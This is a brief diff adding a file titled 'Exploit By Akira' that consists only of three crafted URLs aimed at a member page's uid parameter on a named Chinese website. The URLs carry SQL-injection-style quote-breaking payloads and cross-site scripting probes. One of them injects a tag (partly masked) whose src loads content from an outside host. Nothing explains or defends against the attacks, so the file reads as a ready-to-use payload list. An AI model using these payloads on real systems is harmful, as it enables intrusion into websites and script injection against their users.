@@ -1,0 +1,6 @@
+=====================Exploit By Akira ================================= 
+sitedir.com.cn/member/index.php?uid=''%20||%20''''%20||%20''%E6%B6%9B%E5%A3%B0%E4%BE%9D%E6%97%A7''; 
+  
+sitedir.com.cn/member/index.php?uid=%E6%B6%9B%E5%A3%B0%E4%BE%9D%E6%97%A7WFXSSProbe''")/> 
+  
+sitedir.com.cn/member/index.php?uid=%E6%B6%9B%E5%A3%B0%E4%BE%9D%E6%97%A7''"><******%20src=http://www.heimian.com> 
